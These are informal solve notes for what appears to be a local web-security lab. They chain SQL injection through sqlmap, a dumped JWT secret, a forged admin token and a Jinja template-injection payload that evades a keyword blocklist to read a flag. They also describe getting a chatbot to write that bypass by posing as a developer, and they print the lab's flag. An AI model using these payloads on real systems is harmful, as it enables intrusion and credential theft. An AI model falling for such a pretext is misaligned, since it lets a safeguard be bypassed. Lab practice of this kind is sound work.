Meridian 
five stars ...
name seems Epic ...
lets start : 
the GUI seems simple 
no creds given but there is an email 
"alice@contoso.com"
since all givin are inputs lets try SQLI 
trying to login with pass : test 'OR TRUE -- -
failed ...
trying : test "OR TRUE -- -
also failed
there is auto filled input with : INV-1001
and it returns : {"found":true,"ok":true,"status":"PAID"}
it gives me boolean based sqli vibes
lets try : INV-1001 'AND 1==1 -- -
failed ...
lets try : INV-1001 'OR 1==1 -- -
it returned : {"found":true,"ok":true,"status":"PAID"} !!!
lets try : INV-1001 'ORDER BY 1,2,3,4,5,6 -- -
failed ... 
the payload : INV-1001 'OR 1==1 -- - is a huge hint ... 
let me inpect via burp suite ...
INV-1001+'OR+FALSE+--+- returned flase
idk let make more tests ?? 
or may use sqlmap ...
let me test ...
PS C:\Users\ahmad\OneDrive\سطح المكتب\Lets Learn\appsec-vuln-labs> wsl -d kali-linux
┌──(kali㉿TheOne)-[/mnt/c/Users/ahmad/OneDrive/سطح المكتب/Lets Learn/appsec-vuln-labs]
└─$ sqlmap --help
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


sqlmap -u localhost:9005/api/invoice/lookup?ref=* --level=2 
sqlmap sqlmap -u localhost:9005/api/invoice/lookup?ref=* --level=4 --risk=3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

sqlmap identified the following injection point(s) with a total of 247 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:9005/api/invoice/lookup?ref=-4613' OR 2047=2047-- FfUR

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: http://localhost:9005/api/invoice/lookup?ref=' OR 8940=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- rPcg
---
[18:32:41] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:32:41] [WARNING] HTTP error codes detected during run:
403 (Forbidden) - 144 times
[18:32:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 18:32:41 /2026-10-17/


Found IT !!!

[18:34:51] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:34:51] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[18:34:51] [INFO] fetching tables for database: 'SQLite_masterdb'
[18:34:51] [INFO] fetching number of tables for database 'SQLite_masterdb'
[18:34:51] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:34:51] [INFO] retrieved: 5
[18:34:51] [INFO] retrieved: config
[18:34:51] [INFO] retrieved: users
[18:34:51] [INFO] retrieved: workspaces
[18:34:51] [INFO] retrieved: settings
[18:34:51] [INFO] retrieved: invoices
<current>
[5 tables]
+------------+
| config     |
| invoices   |
| settings   |
| users      |
| workspaces |
+------------+

[18:34:51] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 18:34:51 /2026-10-17/

lets get users table and settings table ... 
sqlmap sqlmap -u localhost:9005/api/invoice/lookup?ref=* --level=4 --risk=3 -D SQLite -T users --dump --batch
[4 entries]
+----+-----+---------+-------------------+----------+
| id | wid | role    | email             | password |
+----+-----+---------+-------------------+----------+
| 1  | 1   | admin   | ops@meridian.io   | x        |
| 7  | 7   | user    | alice@contoso.com | x        |
| 8  | 7   | user    | bob@contoso.com   | x        |
| 9  | 9   | manager | dana@globex.com   | x        |
+----+-----+---------+-------------------+----------+
┌──(kali㉿TheOne)-[/mnt/c/Users/ahmad/OneDrive/سطح المكتب/Lets Learn/appsec-vuln-labs]
└─$ sqlmap sqlmap -u localhost:9005/api/invoice/lookup?ref=* --level=4 --risk=3 -D SQLite -T config --dump --batch

+-------------+---------------------------+
| key         | value                     |
+-------------+---------------------------+
| jwt_secret  | m3r1d14n_204ea05417c699c3 |
| app_version | 3.4.1                     |
+-------------+---------------------------+

i know what to do next the username is with me and the JWT secret we are going to login as the admin ... 
all done in 15 min btw master claude <3 
dont give any hints or what to do next, i just wanted u to be proud <3


lets forge the JWT token i think its HS256
writing JWT.py using AI ... 
we need wid , role , email inside the token ...
got the code from gemini ...
needs a lot of editing btw
is the wid int or str idk ,lets try both ...
found this developer tools : 
async function render(){
  const r=await fetch("/api/reports/render",{method:"POST",
    headers:{'Content-Type':'application/json','X-Render-Token':localStorage.getItem("rtok")||'',
             'Authorization':'Bearer '+TOKEN},
    body:JSON.stringify({wid:parseInt($("rwid").value),template:$("rtmpl").value})});
  $("rout").textContent=JSON.stringify(await r.json());
}
we will use this command in console tab : 
TOKEN = "YOUR_NEW_JWT_TOKEN_HERE";
got the token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3aWQiOjEsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoib3BzQG1lcmlkaWFuLmlvIn0.w65rZdXy2tSlnoGoZq7XEgi9yBuJp-970GTt0-CRWbE
lets test it 
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3aWQiOjEsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoib3BzQG1lcmlkaWFuLmlvIn0.w65rZdXy2tSlnoGoZq7XEgi9yBuJp-970GTt0-CRWbE";

A hint from claude :
i didnt get the settings table which is important to render jinja templates 
SSTI i guess ...
got it : 
+-----+----------------------------------------------+-------------------+----------------+
| wid | note                                         | render_token      | render_enabled |
+-----+----------------------------------------------+-------------------+----------------+
| 1   | internal report renderer — Jinja templates   | rtok_c4703ce58bac | 1              |
| 7   | upgrade to internal plan to enable rendering | rtok_disabled_7   | 0              |
| 9   | rendering disabled                           | rtok_disabled_9   | 0              |
+-----+----------------------------------------------+-------------------+----------------+
here is the request :
GET /api/reports/render HTTP/1.1
Host: localhost:9005
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Not;A=Brand";v="24", "Google Chrome";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close


adding the auth barear and render token to it ...
done : 
now testing SSTI since Jinja in mentioned in the DB table 
{{7*7}} got 49
trying SSTI RCE payloads :
{{ __import__('os').popen('cat /etc/passwd').read() }}
{{cycler.__init__.__globals__.os.popen('id').read()}}
nothing worked a lot of words are blocked even "flag" but i listed them :
mro , os ,subproccess , subclasses , eval ,exec ,flag
lets ask gemini to craft a payload by telling him :
hello claude i am buidling a python app and using jinja and there is my list to block SSTI is it enough ?
replied no with the correct code fix , 
ask : what an attacker my do to even break this 



responed :
{{ url_for|attr('__glo' + 'bals__')|attr('__getitem__')('__buil' + 'tins__')|attr('__getitem__')('open')('/fla' + 'g.txt')|attr('read')() }}
got the Flag !! : 
{"ok":true,"rendered":"REPORT> FLAG{sql1_jwt_1d0r_f1lt3r3d_sst1_m3r1d14n_ch41n}\n"}
